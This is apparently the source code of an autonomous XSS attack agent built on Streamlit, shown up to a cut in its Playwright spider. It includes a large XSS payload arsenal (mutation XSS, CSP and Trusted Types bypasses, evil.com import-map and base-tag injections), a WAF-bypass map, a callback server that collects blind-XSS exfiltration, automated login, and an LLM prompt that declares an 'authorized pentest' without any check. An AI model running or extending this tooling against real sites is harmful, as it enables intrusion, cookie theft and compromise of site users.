import streamlit as st
import os
import subprocess
import requests
import re
import urllib.parse
import json
import html as html_lib
import socket
import threading
import queue
import time
import concurrent.futures
from http.server import HTTPServer, BaseHTTPRequestHandler
from openai import OpenAI
from bs4 import BeautifulSoup
from collections import deque
from datetime import datetime

try:
    from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    PLAYWRIGHT_OK = True
except ImportError:
    PLAYWRIGHT_OK = False

st.set_page_config(
    page_title="XSS Autonomous Agent",
    page_icon="🕷️",
    layout="wide",
    initial_sidebar_state="collapsed",
)

# ── Constants ──────────────────────────────────────────────────────────────────
MODEL       = "deepseek/deepseek-chat-v3-0324"
BASE_URL    = "https://openrouter.ai/api/v1"
MAX_TOKENS  = 2500
MAX_PAGES   = 50
REQ_TIMEOUT = 12
OOB_PORT    = 8081

REQ_HEADERS = {
    "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection":      "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

# ── Modern payload arsenal ─────────────────────────────────────────────────────
BASE_PAYLOADS = [
    # Classic
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    # Attribute breakout
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    '" onmouseover="alert(1)',
    # HTML5
    '<details open ontoggle=alert(1)>',
    '<video src=1 onerror=alert(1)>',
    '<audio src=1 onerror=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<body onpageshow=alert(1)>',
    '<marquee onstart=alert(1)>',
    # JS context
    '";alert(1)//', "';alert(1)//", '`-alert(1)-`',
    '</script><script>alert(1)</script>',
    # No-paren
    '<img src=x onerror="alert`1`">',
    'onerror=alert;throw 1',
    '<img src=x onerror=window[`al`+`ert`](1)>',
    # Angular CSTI
    '{{constructor.constructor("alert(1)")()}}',
    '{{$on.constructor("alert(1)")()}}',
    # Vue CSTI
    '{{_c.constructor("alert(1)")()}}',
    # DOM clobbering
    '<form id=x><input name=attributes></form>',
    '<a id=x tabindex=1 onfocus=alert(1)></a>',
    # Mutation XSS (mXSS) — bypass innerHTML sanitizers
    '<listing><img src=1 onerror=alert(1)></listing>',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<!--<img src="--><img src=x onerror=alert(1)>',
    '<table><td><img src=x onerror=alert(1)></table>',
    '<select><option><img src=x onerror=alert(1)></option></select>',
    '<form><math><mtext></form><form><mglyph><svg><mtext></svg><img src=x onerror=alert(1)>',
    '<math><annotation-xml encoding="text/html"><img src=1 onerror=alert(1)></annotation-xml></math>',
    # Trusted Types bypass
    '<script>window.trustedTypes&&trustedTypes.createPolicy("default",{createHTML:s=>s});document.write("<img src=x onerror=alert(1)>")</script>',
    # Import map injection
    '<script type="importmap">{"imports":{"lodash":"//evil.com/xss.js"}}</script>',
    # atob decode
    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    # Function constructor
    '<img src=x onerror=Function("alert(1)")()>',
    # String.fromCharCode
    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
    # Polyglots
    'javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>',
    '-->"><svg/onload=alert(1)><!--',
    # CSP bypass via base tag
    '<base href=//evil.com/>',
    # URL/href
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    # HTML only injection
    '<h1 style="position:fixed;top:0;left:0;width:100%;background:red;color:white;z-index:9999">INJECTED</h1>',
    '<iframe src=javascript:alert(document.domain)>',
    # SSTI probes
    '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}',
    # JSON injection
    '"},"xss":"<script>alert(1)</script>',
    # Encoding
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '\u003cscript\u003ealert(1)\u003c/script\u003e',
    # JSONP
    'alert(document.domain)//',
]

DOM_SINKS = [
    r"innerHTML\s*[+=]", r"outerHTML\s*[+=]",
    r"document\.write\s*\(", r"document\.writeln\s*\(",
    r"\.insertAdjacentHTML\s*\(",
    r"eval\s*\(", r"setTimeout\s*\(\s*['\"`]",
    r"setInterval\s*\(\s*['\"`]", r"new\s+Function\s*\(",
    r"location\.href\s*=", r"location\.assign\s*\(",
    r"dangerouslySetInnerHTML", r"v-html\s*=", r"\.html\s*\(",
    r"document\.URL", r"location\.hash", r"location\.search",
    r"document\.referrer", r"window\.name",
    r"__proto__", r"prototype\[", r"\.srcdoc\s*=",
    r"postMessage\s*\(", r"addEventListener\s*\(\s*['\"]message",
    r"trustedTypes", r"importScripts\s*\(", r"ServiceWorker",
]

TECH_SIGNATURES = {
    "WordPress":   [r"wp-content", r"wp-includes"],
    "Drupal":      [r"drupal", r"/sites/default/files"],
    "Joomla":      [r"joomla", r"/components/com_"],
    "Laravel":     [r"laravel_session", r"XSRF-TOKEN"],
    "Django":      [r"csrfmiddlewaretoken", r"django"],
    "Rails":       [r"authenticity_token", r"_rails_"],
    "Angular":     [r"ng-version", r"ng-app", r"\[routerLink\]"],
    "React":       [r"__react", r"data-reactroot", r"__NEXT_DATA__"],
    "Vue":         [r"__vue__", r"v-app", r"data-v-"],
    "Next.js":     [r"__NEXT_DATA__", r"_next/static"],
    "Nuxt.js":     [r"__NUXT__", r"_nuxt/"],
    "Shopify":     [r"Shopify", r"myshopify\.com"],
    "Wix":         [r"wix\.com", r"wixsite\.com"],
}

WAF_SIGNATURES = {
    "Cloudflare":  ["cloudflare", "cf-ray", "__cfduid", "cf_clearance"],
    "AWS WAF":     ["awswaf", "x-amzn-requestid", "x-amzn-trace-id"],
    "ModSecurity": ["mod_security", "modsecurity"],
    "Akamai":      ["akamai", "ak_bmsc", "bm_sz"],
    "Sucuri":      ["sucuri", "x-sucuri-id"],
    "Imperva":     ["imperva", "incapsula", "visid_incap"],
    "Wordfence":   ["wordfence", "wfvt_"],
    "F5 BIG-IP":   ["bigipserver", "BIGipServer"],
    "PerimeterX":  ["_pxde", "_pxvid", "pxcts"],
}

TEMPLATE_ENGINES = {
    "jinja2":    [r"render_template", r"Jinja2"],
    "django":    [r"django\.template", r"{% csrf_token"],
    "twig":      [r"Twig\\", r"\.twig"],
    "handlebars":[r"Handlebars", r"{{#if"],
    "thymeleaf": [r"th:text", r"th:utext"],
    "erb":       [r"<%=", r"ActionView"],
}

# ── Session state ──────────────────────────────────────────────────────────────
defaults = {
    "log": [], "findings": [], "running": False, "done": False,
    "pages_crawled": 0, "points_found": 0, "vulns_found": 0,
    "exploit_code": "", "report": "", "dom_sinks": [],
    "waf_detected": "", "infra": {}, "attack_plan": "",
    "oob_hits": [], "second_order_hits": [],
    "_last_target": "", "_last_payload": "", "_last_depth": 2,
    "_last_blind_url": "", "_last_cookies": "", "_last_login_url": "",
    "_last_login_user": "", "_last_login_pass": "",
}
for k, v in defaults.items():
    if k not in st.session_state:
        st.session_state[k] = v


def get_client():
    key = os.environ.get("OPENROUTER_API_KEY", "")
    if not key:
        st.error("OPENROUTER_API_KEY not set in Replit Secrets.")
        st.stop()
    return OpenAI(api_key=key, base_url=BASE_URL)


# ══════════════════════════════════════════════════════════════════════════════
# BUILT-IN OOB (OUT-OF-BAND) CALLBACK SERVER
# Listens on port 8081 — receives blind XSS callbacks automatically
# ══════════════════════════════════════════════════════════════════════════════
_oob_queue  = queue.Queue()
_oob_server = None

class _OOBHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        ts   = datetime.now().strftime("%H:%M:%S")
        data = urllib.parse.unquote(self.path)
        ref  = self.headers.get("Referer", "")
        ua   = self.headers.get("User-Agent", "")
        hit  = {"time": ts, "path": data, "referer": ref, "ua": ua[:120], "type": "GET"}
        _oob_queue.put(hit)
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode("utf-8", errors="replace")
        ts     = datetime.now().strftime("%H:%M:%S")
        ref    = self.headers.get("Referer", "")
        hit    = {"time": ts, "path": self.path, "body": body[:500],
                  "referer": ref, "type": "POST"}
        _oob_queue.put(hit)
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *args):
        pass  # silence default logging


def _start_oob_server():
    global _oob_server
    if _oob_server is not None:
        return
    try:
        _oob_server = HTTPServer(("0.0.0.0", OOB_PORT), _OOBHandler)
        t = threading.Thread(target=_oob_server.serve_forever, daemon=True)
        t.start()
    except Exception:
        _oob_server = None


def _oob_url() -> str:
    """Public URL of OOB server — uses Replit's proxied domain."""
    domain = os.environ.get("REPLIT_DEV_DOMAIN", "")
    if domain:
        # Replit exposes port 8081 via subdomain
        parts = domain.split(".")
        if parts:
            parts[0] = parts[0] + "-8081"
            return "https://" + ".".join(parts)
    return f"http://localhost:{OOB_PORT}"


def _poll_oob_hits():
    """Drain the OOB queue and add to session state."""
    hits = []
    while not _oob_queue.empty():
        try:
            hits.append(_oob_queue.get_nowait())
        except queue.Empty:
            break
    if hits:
        st.session_state.oob_hits.extend(hits)
    return hits


# ── Terminal ──────────────────────────────────────────────────────────────────
ICONS = {
    "info": "▸", "ok": "✅", "warn": "⚠️", "vuln": "🚨",
    "ai": "🤖", "cmd": "⚙️", "dom": "🔬", "blind": "👁️",
    "hunt": "🔭", "skip": "⏭️", "infra": "🏗️", "plan": "📋",
    "html": "🔀", "oob": "📡", "auth": "🔑", "spider": "🕸️",
    "second": "🔄",
}

_TERM_HEIGHT = 560

def _build_terminal_html() -> str:
    raw_lines = st.session_state.log if st.session_state.log else ["Ready — enter a target and launch."]
    count  = len(raw_lines)
    body_h = _TERM_HEIGHT - 40

    def _color(line: str) -> str:
        l = line.lower()
        if "🚨" in line or "confirmed" in l or "critical" in l:
            return "#ff4444"
        if "📡" in line or "oob" in l or "callback" in l:
            return "#ff79c6"
        if "⚠️" in line or "reflected" in l:
            return "#ffaa00"
        if "✅" in line or "done" in l:
            return "#39ff14"
        if "🤖" in line or "ai " in l or "phase 0" in l:
            return "#58a6ff"
        if "🏗️" in line or "infra" in l:
            return "#c792ea"
        if "📋" in line or "plan" in l:
            return "#7fdbca"
        if "🔀" in line or "html changed" in l or "mutated" in l:
            return "#ff79c6"
        if "🕸️" in line or "spa" in l or "playwright" in l:
            return "#f1fa8c"
        if "🔑" in line or "auth" in l or "login" in l:
            return "#8be9fd"
        if "🔄" in line or "second" in l:
            return "#bd93f9"
        return "#b3e5fc"

    rows = "".join(
        f'<div class="ln" style="color:{_color(l)}">'
        + l.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        + '</div>'
        for l in reversed(raw_lines)
    )

    return f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
html,body{{height:{_TERM_HEIGHT}px;overflow:hidden;background:#0d1117;
  font-family:'Courier New',monospace;font-size:12.5px;}}
#tb{{display:flex;justify-content:space-between;align-items:center;
  background:#161b22;border-bottom:1px solid #238636;
  padding:4px 12px;height:40px;flex-shrink:0;}}
#tb span{{color:#58a6ff;font-size:11px;}}
#tb button{{background:none;border:1px solid #238636;color:#39ff14;
  border-radius:4px;padding:2px 9px;cursor:pointer;
  font-size:11px;margin-left:5px;font-family:'Courier New',monospace;}}
#tb button:hover{{background:#238636;color:#fff;}}
#term{{height:{body_h}px;overflow-y:auto;
  display:flex;flex-direction:column-reverse;scroll-behavior:smooth;}}
.ln{{padding:0 16px;line-height:1.65;white-space:pre-wrap;word-break:break-all;}}
</style></head><body>
<div id="tb">
  <span>💻 Agent Terminal &nbsp;·&nbsp; {count} lines</span>
  <span>
    <button onclick="document.getElementById('term').scrollTop=document.getElementById('term').scrollHeight">⬆ Old</button>
    <button onclick="document.getElementById('term').scrollTop=0">⬇ New</button>
    <button id="fsbtn" onclick="toggleFS()">⛶ Fullscreen</button>
  </span>
</div>
<div id="term">{rows}</div>
<script>
document.getElementById('term').scrollTop = 0;
function toggleFS(){{
  var fr=window.frameElement,t=document.getElementById('term'),btn=document.getElementById('fsbtn');
  if(!fr){{var el=document.documentElement;(el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen||function(){{}}).call(el);return;}}
  if(fr._xssFS){{['position','top','left','width','height','z-index','border','background','max-width','max-height'].forEach(function(p){{fr.style.removeProperty(p);}});fr._xssFS=false;t.style.height='{body_h}px';btn.textContent='⛶ Fullscreen';}}
  else{{[['position','fixed'],['top','0'],['left','0'],['width','100vw'],['height','100vh'],['z-index','2147483647'],['border','none'],['background','#0d1117'],['max-width','none'],['max-height','none']].forEach(function(kv){{fr.style.setProperty(kv[0],kv[1],'important');}});fr._xssFS=true;t.style.height='calc(100vh - 40px)';btn.textContent='✕ Exit';t.scrollTop=0;try{{window.parent.scrollTo(0,0);}}catch(e){{}}}}
}}
</script>
</body></html>"""


def _draw_terminal(ph):
    import streamlit.components.v1 as _components
    with ph.container():
        _components.html(_build_terminal_html(), height=_TERM_HEIGHT + 4)


def log(msg: str, kind: str = "info", term_ph=None, stats_phs=None):
    ts = datetime.now().strftime("%H:%M:%S")
    prefix = ICONS.get(kind, "▸")
    st.session_state.log.append(f"[{ts}] {prefix}  {msg}")
    if term_ph is not None:
        _draw_terminal(term_ph)
    if stats_phs is not None:
        _render_stats(*stats_phs)


def _render_stats(s1, s2, s3, s4, s5):
    s1.metric("Pages",         st.session_state.pages_crawled)
    s2.metric("Injection pts", st.session_state.points_found)
    s3.metric("DOM sinks",     len(st.session_state.dom_sinks))
    s4.metric("Vulns",         st.session_state.vulns_found,
              delta="🚨" if st.session_state.vulns_found > 0 else None)
    s5.metric("WAF", f"⚠️ {st.session_state.waf_detected}"
              if st.session_state.waf_detected else "✅ None")


# ── Network helpers ────────────────────────────────────────────────────────────
def _make_session(cookie_str: str = "") -> requests.Session:
    sess = requests.Session()
    sess.headers.update(REQ_HEADERS)
    if cookie_str.strip():
        for part in cookie_str.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                sess.cookies.set(k.strip(), v.strip())
    return sess


def safe_req(method: str, url: str, session=None, **kwargs):
    try:
        fn_obj = session or requests
        fn = getattr(fn_obj, method.lower())
        kw = dict(timeout=REQ_TIMEOUT, allow_redirects=True)
        if not session:
            kw["headers"] = REQ_HEADERS
        kw.update(kwargs)
        return fn(url, **kw)
    except Exception:
        return None


def same_origin(base: str, url: str) -> bool:
    try:
        return urllib.parse.urlparse(base).netloc == urllib.parse.urlparse(url).netloc
    except Exception:
        return False


def to_abs(base: str, href: str):
    try:
        url = urllib.parse.urljoin(base, href)
        p = urllib.parse.urlparse(url)
        if p.scheme in ("http", "https") and p.netloc:
            return url
    except Exception:
        pass
    return None


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 0 — INFRASTRUCTURE RECON
# ══════════════════════════════════════════════════════════════════════════════
def phase0_infrastructure(target: str, session: requests.Session,
                           term_ph, stats_phs) -> dict:
    L = lambda m, k="infra": log(m, k, term_ph, stats_phs)
    infra = {}
    parsed   = urllib.parse.urlparse(target)
    hostname = parsed.netloc.split(":")[0]
    base     = f"{parsed.scheme}://{parsed.netloc}"
    L(f"Target: {hostname}")

    # DNS
    try:
        ips = list({r[4][0] for r in socket.getaddrinfo(hostname, None)})
        infra["ips"] = ips
        L(f"IPs: {', '.join(ips)}")
    except Exception:
        infra["ips"] = []

    # Parallel recon fetches
    recon_urls = [target,
                  base + "/robots.txt",
                  base + "/sitemap.xml",
                  base + "/.well-known/security.txt"]

    def _fetch(url):
        try:
            return url, session.get(url, timeout=8, allow_redirects=True)
        except Exception:
            return url, None

    resp_map = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
        for url, resp in ex.map(_fetch, recon_urls):
            resp_map[url] = resp

    resp = resp_map.get(target)
    if not resp:
        L("Target unreachable!", "warn")
        return infra

    infra["server"]       = resp.headers.get("server", "")
    infra["x_powered_by"] = resp.headers.get("x-powered-by", "")
    infra["status"]       = resp.status_code
    if infra["server"]:      L(f"Server: {infra['server']}")
    if infra["x_powered_by"]:L(f"X-Powered-By: {infra['x_powered_by']}")

    # WAF
    combined_low = (resp.text[:3000] + str(resp.headers) + str(resp.cookies)).lower()
    for waf, sigs in WAF_SIGNATURES.items():
        if any(s.lower() in combined_low for s in sigs):
            infra["waf"] = waf
            st.session_state.waf_detected = waf
            L(f"WAF DETECTED: {waf}", "warn")
            break
    else:
        if resp.status_code in (403, 406, 429, 503) and len(resp.text) < 500:
            infra["waf"] = "Unknown WAF"
            st.session_state.waf_detected = "Unknown WAF"
            L("Unknown WAF / bot-protection", "warn")
        else:
            infra["waf"] = ""
            L("No WAF detected")

    # Tech stack
    infra["tech"] = []
    for tech, sigs in TECH_SIGNATURES.items():
        if any(re.search(s, resp.text, re.I) for s in sigs):
            infra["tech"].append(tech)
    L(f"Tech: {', '.join(infra['tech']) or 'unknown'}")

    # Template engine
    infra["template_engine"] = ""
    for eng, sigs in TEMPLATE_ENGINES.items():
        if any(re.search(s, resp.text, re.I) for s in sigs):
            infra["template_engine"] = eng
            L(f"Template engine: {eng}", "warn")
            break

    # Security headers & CSP
    hkeys = {k.lower(): v for k, v in resp.headers.items()}
    infra["header_issues"] = []
    infra["headers_raw"]   = dict(resp.headers)

    csp = hkeys.get("content-security-policy", "")
    infra["csp"] = csp
    infra["csp_bypasses"] = []
    if not csp:
        infra["header_issues"].append("NO CSP — all inline scripts allowed")
        L("No CSP — payloads should execute freely", "warn")
    else:
        csp_bypasses = []
        if "unsafe-inline" in csp: csp_bypasses.append("unsafe-inline present")
        if "unsafe-eval"   in csp: csp_bypasses.append("unsafe-eval present")
        if "data:"         in csp: csp_bypasses.append("data: URI in script-src")
        if re.search(r"script-src[^;]*\*", csp): csp_bypasses.append("Wildcard in script-src")
        for cdn in ["cdn.jsdelivr.net","cdnjs.cloudflare.com","ajax.googleapis.com",
                    "unpkg.com","rawgit.com","ajax.aspnetcdn.com"]:
            if cdn in csp: csp_bypasses.append(f"CDN {cdn} — JSONP bypass possible")
        if "nonce-" in csp: csp_bypasses.append("Nonce-based — check if nonce is static")
        infra["csp_bypasses"] = csp_bypasses
        for b in csp_bypasses:
            L(f"CSP bypass: {b}", "warn")
        if not csp_bypasses:
            L("CSP appears strict", "warn")

    for h, msg in [
        ("x-xss-protection",         "No X-XSS-Protection"),
        ("x-content-type-options",   "No X-Content-Type-Options"),
        ("x-frame-options",          "No X-Frame-Options — clickjacking"),
        ("strict-transport-security","No HSTS"),
    ]:
        if h not in hkeys:
            infra["header_issues"].append(msg)

    # Cookie audit
    cookie_hdr = hkeys.get("set-cookie", "")
    infra["cookie_issues"] = []
    if cookie_hdr:
        if "httponly" not in cookie_hdr.lower():
            infra["cookie_issues"].append("HttpOnly MISSING — JS can steal cookies")
            L("Cookie missing HttpOnly!", "warn")
        if "samesite" not in cookie_hdr.lower():
            infra["cookie_issues"].append("SameSite MISSING — CSRF risk")
        if "secure" not in cookie_hdr.lower():
            infra["cookie_issues"].append("Secure flag MISSING")

    # CORS
    try:
        cors_resp = session.get(target, headers={"Origin": "https://evil.com"}, timeout=8)
        acao = cors_resp.headers.get("access-control-allow-origin", "")
        acac = cors_resp.headers.get("access-control-allow-credentials", "")
        if acao in ("*", "https://evil.com"):
            infra["cors_vuln"] = f"CORS allows {acao} credentials={acac}"
            L(f"CORS MISCONFIGURATION: {acao} creds={acac}", "vuln")
        else:
            infra["cors_vuln"] = ""
    except Exception:
        infra["cors_vuln"] = ""

    # Robots.txt
    robots_resp = resp_map.get(base + "/robots.txt")
    if robots_resp and robots_resp.status_code == 200:
        disallowed = re.findall(r"Disallow:\s*(/[^\s]+)", robots_resp.text, re.I)
        infra["robots_disallowed"] = disallowed[:15]
        if disallowed:
            L(f"robots.txt: {len(disallowed)} disallowed paths → {disallowed[:3]}", "warn")
    else:
        infra["robots_disallowed"] = []

    # Vulnerable JS libs
    soup = BeautifulSoup(resp.text, "lxml")
    vuln_libs = []
    for tag in soup.find_all("script", src=True):
        src = tag["src"].lower()
        for lib, vers in [("jquery",["1.6","1.7","1.8","1.9","1.10","1.11","2.0","2.1"]),
                          ("angular",["1.0","1.1","1.2","1.3","1.4","1.5","1.6"])]:
            if lib in src:
                for v in vers:
                    if v in src:
                        vuln_libs.append(f"{lib} {v}.x (outdated)")
    infra["vuln_libs"] = vuln_libs
    if vuln_libs:
        for lib in vuln_libs:
            L(f"Vulnerable JS lib: {lib}", "warn")

    # WordPress extras
    if "WordPress" in infra["tech"]:
        def _chk_wp(path):
            u = base + path
            try:
                r = session.get(u, timeout=6, allow_redirects=False)
                return path, r.status_code
            except Exception:
                return path, 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
            for path, code in ex.map(_chk_wp,
                ["/wp-login.php","/wp-admin/","/xmlrpc.php","/wp-json/wp/v2/users"]):
                if code in (200,301,302):
                    L(f"WordPress path: {path} [{code}]", "warn")
                    infra.setdefault("wp_paths",[]).append(path)

    L(f"Recon done — {len(infra.get('header_issues',[]))} issues | WAF={infra.get('waf','none')}", "ok")
    return infra


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 0.5 — AI ATTACK PLANNING
# ══════════════════════════════════════════════════════════════════════════════
def phase05_plan(client, target: str, infra: dict, user_payload: str,
                 term_ph, stats_phs) -> dict:
    L = lambda m, k="plan": log(m, k, term_ph, stats_phs)
    L("AI analyzing infra → generating targeted attack plan...")

    waf_bypass_map = {
        "Cloudflare":  "unicode \\u003c\\u003e, atob(), backtick templates, SVG/MathML, no-paren alert`1`",
        "AWS WAF":     "double-encode %253C, null byte %00, comment breaks, tab/newline in tags",
        "ModSecurity": "\\x hex, alternate event handlers (onpointerenter), data: URIs",
        "Akamai":      "unicode codepoints, exotic events (onpointerrawupdate), whitespace tricks",
        "Imperva":     "nested tags, CSS expression(), attribute value splitting",
        "Sucuri":      "SVG/MathML, HTML5 semantic tags, encoded chars",
        "Wordfence":   "atob(), Function constructor, toString(36)",
        "PerimeterX":  "slow/behavioral evasion, randomize, normal form data + payload",
    }
    waf = infra.get("waf", "none")
    waf_note = waf_bypass_map.get(waf, "encoding combos, case mix, exotic tags")

    prompt = f"""Elite red-team operator. Authorized pentest. Give a JSON attack plan.

TARGET: {target}
GOAL: {user_payload}

INFRA:
- Server: {infra.get('server','?')} X-Powered-By: {infra.get('x_powered_by','?')}
- Tech: {infra.get('tech',[])}
- Template: {infra.get('template_engine','?')}
- WAF: {waf} → bypass: {waf_note}
- CSP: {infra.get('csp','NONE')} | bypasses: {infra.get('csp_bypasses',[])}
- CORS: {infra.get('cors_vuln','none')}
- Cookie issues: {infra.get('cookie_issues',[])}
- Vuln libs: {infra.get('vuln_libs',[])}
- Robots disallowed: {infra.get('robots_disallowed',[])[:5]}

Output ONLY JSON (no markdown):
{{
  "priority_vectors": [{{"vector":"...","reason":"...","priority":1}}],
  "top_payloads": ["...", ...],
  "skip_phases": [],
  "focus_fields": [],
  "waf_bypass_strategy": "...",
  "csp_bypass_strategy": "...",
  "mutation_xss_candidates": ["...", ...],
  "stored_xss_note": "...",
  "attack_summary": "2-sentence best attack path"
}}"""

    try:
        resp = client.chat.completions.create(
            model=MODEL, messages=[{"role":"user","content":prompt}],
            max_tokens=1500, temperature=0.3)
        raw = re.sub(r"```[a-z]*\n?|```", "", resp.choices[0].message.content.strip()).strip()
        m = re.search(r"\{.*\}", raw, re.DOTALL)
        if m:
            plan = json.loads(m.group())
            L(f"Plan: {plan.get('attack_summary','')}", "plan")
            L(f"WAF bypass: {plan.get('waf_bypass_strategy','')[:90]}", "plan")
            L(f"CSP bypass: {plan.get('csp_bypass_strategy','')[:90]}", "plan")
            for v in plan.get("priority_vectors",[])[:3]:
                L(f"  P{v.get('priority','?')}: {v.get('vector')} — {v.get('reason','')[:70]}", "plan")
            return plan
    except Exception as e:
        L(f"AI plan failed: {e}", "warn")
    return {"top_payloads":[], "skip_phases":[], "focus_fields":[], "attack_summary":"Broad sweep."}


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 0.8 — AUTHENTICATION
# Auto-detect login form + submit credentials, OR use provided cookies
# ══════════════════════════════════════════════════════════════════════════════
def phase08_auth(target: str, session: requests.Session,
                 login_url: str, username: str, password: str,
                 term_ph, stats_phs) -> bool:
    L = lambda m, k="auth": log(m, k, term_ph, stats_phs)
    if not login_url.strip() and not username.strip():
        return False

    url = login_url.strip() or target
    L(f"Attempting login at {url}")

    try:
        resp = session.get(url, timeout=10)
        soup = BeautifulSoup(resp.text, "lxml")
        form = soup.find("form")
        if not form:
            L("No form found at login URL", "warn")
            return False

        action = to_abs(url, form.get("action") or url)
        method = form.get("method", "post").lower()
        data   = {}

        # Fill all fields
        for inp in form.find_all(["input", "textarea"]):
            name  = inp.get("name") or ""
            itype = inp.get("type","text").lower()
            val   = inp.get("value","")
            if not name:
                continue
            if itype in ("submit","button","image"):
                continue
            # Guess username/password fields
            if any(k in name.lower() for k in ["user","login","email","mail","name"]):
                data[name] = username
            elif any(k in name.lower() for k in ["pass","pwd","secret"]):
                data[name] = password
            elif itype == "hidden":
                data[name] = val  # CSRF token etc.
            else:
                data[name] = val or "test"

        fn = session.post if method == "post" else session.get
        r2 = fn(action, data=data, timeout=10, allow_redirects=True)
        # Heuristic: if we end up NOT back at the login page → success
        if r2.url != url and r2.status_code in (200, 302):
            L(f"Login appears successful — session cookies set | redirect to {r2.url[:60]}", "auth")
            return True
        else:
            L("Login submitted but may have failed — check credentials", "warn")
            return False
    except Exception as e:
        L(f"Login error: {e}", "warn")
        return False


# ══════════════════════════════════════════════════════════════════════════════
# PLAYWRIGHT JS SPIDER — crawls SPAs after JS renders
# ══════════════════════════════════════════════════════════════════════════════
def playwright_spider(target: str, max_pages: int, session: requests.Session,
                      term_ph, stats_phs) -> list:
    """
    Uses Playwright to:
    - Render pages with full JS execution
    - Intercept network requests (find API endpoints, form actions)
    - Click links and buttons to discover SPA routes
    - Extract forms, inputs, params that only appear after JS renders
    Returns a list of page dicts compatible with the regular crawler output.
    """
    if not PLAYWRIGHT_OK:
        log("Playwright unavailable — JS spider skipped", "skip", term_ph, stats_phs)
        return []

    L = lambda m, k="spider": log(m, k, term_ph, stats_phs)
    L(f"JS spider launching (SPA/dynamic content crawl) — up to {max_pages} pages")

    pages    = []
    visited  = set()
    api_hits = set()

    # Extract session cookies to pass into Playwright
    raw_cookies = [{"name": c.name, "value": c.value,
                    "domain": urllib.parse.urlparse(target).netloc,
                    "path": "/"}
                   for c in session.cookies]

    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True, args=[
                "--no-sandbox","--disable-setuid-sandbox",
                "--disable-dev-shm-usage","--disable-gpu",
                "--disable-web-security","--allow-running-insecure-content",
            ])
            ctx = browser.new_context(
                ignore_https_errors=True,
                user_agent=REQ_HEADERS["User-Agent"],
            )
            if raw_cookies:
                ctx.add_cookies(raw_cookies)

            # Track network requests to find API endpoints
            def _on_request(req):
                url = req.url
                if any(k in url for k in ["/api/","/v1/","/v2/","/graphql","/rest/"]):
                    api_hits.add(url)

            def _spider_page(url: str, depth: int):
                if url in visited or len(pages) >= max_pages:
                    return
                visited.add(url)

                pg = ctx.new_page()
                pg.on("request", _on_request)
                try:
                    pg.goto(url, wait_until="networkidle", timeout=14000)
                except Exception:
                    try:
                        pg.goto(url, wait_until="domcontentloaded", timeout=8000)
                        pg.wait_for_timeout(2000)
                    except Exception:
                        pg.close()
                        return

                # Get rendered HTML (post-JS)
                try:
                    rendered_html = pg.content()
                    current_url   = pg.url
                except Exception:
                    pg.close()
                    return

                soup   = BeautifulSoup(rendered_html, "lxml")
                forms  = _extract_forms(current_url, soup)
                params = _extract_params(current_url)
                sinks  = _find_dom_sinks(rendered_html)

                # Also extract forms via Playwright's locator (catches shadow DOM)
                extra_inputs = []
                try:
                    for loc in pg.locator("input[name], textarea[name], select[name]").all():
                        name  = loc.get_attribute("name") or ""
                        itype = loc.get_attribute("type") or "text"
                        val   = loc.get_attribute("value") or ""
                        if name and itype not in ("submit","button","image","file"):
                            extra_inputs.append({"name": name, "type": itype, "value": val})
                except Exception:
                    pass

                # Merge extra inputs into first form or create synthetic form
                if extra_inputs and not forms:
                    forms = [{"action": current_url, "method": "get",
                              "fields": extra_inputs, "enctype": ""}]
                elif extra_inputs and forms:
                    seen_names = {f["name"] for fm in forms for f in fm["fields"]}
                    new = [inp for inp in extra_inputs if inp["name"] not in seen_names]
                    if new:
                        forms[0]["fields"].extend(new)

                page_data = {
                    "url": current_url,
                    "html": rendered_html[:20000],
                    "status": 200,
                    "headers": {},
                    "forms": forms,
                    "params": params,
                    "dom_sinks": sinks,
                    "inline_js": _inline_js(soup),
                    "js_endpoints": list(api_hits)[:15],
                    "redirect_params": _find_open_redirect_params(rendered_html, current_url),
                    "jsonp_endpoints": _find_jsonp_endpoints(rendered_html, current_url),
                    "postmessage_handlers": _find_postmessage_handlers(rendered_html),
                    "spa_rendered": True,
                }
                pages.append(page_data)
                st.session_state.pages_crawled = len(pages)
                L(f"[JS {len(pages)}] {current_url[:65]} — "
                  f"{len(forms)} forms / {len(params)} params / {len(sinks)} sinks")

                # Follow links (SPA routes)
                if depth < 2:
                    links = set()
                    try:
                        for a in pg.locator("a[href]").all()[:30]:
                            href = a.get_attribute("href") or ""
                            abs_url = to_abs(current_url, href)
                            if abs_url and same_origin(target, abs_url):
